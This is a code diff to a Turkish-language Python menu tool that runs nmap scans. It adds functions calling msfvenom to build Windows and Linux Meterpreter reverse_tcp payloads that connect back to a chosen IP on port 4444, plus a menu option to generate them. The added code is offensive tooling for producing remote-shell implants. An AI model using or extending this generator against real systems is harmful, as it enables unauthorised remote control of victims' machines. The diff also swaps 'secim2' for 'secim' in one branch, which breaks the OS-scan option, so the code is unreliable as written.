@@ -40,6 +40,7 @@ def port_tara(ip):
         text=True
     )
     print(result.stdout)
+
 def os_tara(ip):
     result = subprocess.run(
         ["nmap", "-O", ip],
@@ -48,6 +49,7 @@ def os_tara(ip):
         text=True
     )
     print(result.stdout)
+
 def sv_tara(ip):
     result = subprocess.run(
         ["nmap", "-sV", ip],
@@ -56,6 +58,24 @@ def sv_tara(ip):
         text=True
     )
     print(result.stdout)
+
+def payloadWin(Lip, dosya):
+    result = subprocess.run(
+        ["msfvenom", "-p", "windows/meterpreter/reverse_tcp","LHOST="+Lip, "LPORT=4444", "-f","exe","-o", dosya],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
+    print(result.stdout)
+
+def payloadLin(Lip, dosya):
+    result = subprocess.run(
+        ["msfvenom", "-p", "payload/linux/x64/meterpreter/reverse_tcp","LHOST="+Lip, "LPORT=4444", "-f","elf","-o", dosya],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
+    print(result.stdout)    
 
 # ---- IP DOĞRULAMA KISMI ----
 print("""
@@ -99,7 +119,7 @@ while True:
               |  2) Port Taraması                          |
               |  3) İşletim Sistemi Taraması               |
               |  4) Servis Versiyon Taraması               |
-              |  5) Geri                                   |
+              |  5) Payloads Oluştur                       |
               |  6) Çıkış                                  |
               |                                            |
               ----------------------------------------------
@@ -109,13 +129,19 @@ while True:
                 ping_at(ip)
             elif secim2 == "2":
                 port_tara(ip)
-            elif secim2 == "3":
+            elif secim == "3":
                 os_tara(ip)
             elif secim2 == "4":
                 sv_tara(ip)
-            #elif secim2 == "5":
+            elif secim2 == "5":
+                os = input("İşletim Sistemi Seçiniz (1-Windows, 2-Linux): ")
+                Lip = input("Yerel İp: ")
+                dosya = input("Dosya Adı: ")
+                if os == "1":
+                    payloadWin(Lip, dosya)
+                elif os == "2":
+                    payloadLin(Lip, dosya)        
             elif secim2 == "6":
                 sys.exit()
     elif secim == "3":
-
         sys.exit()
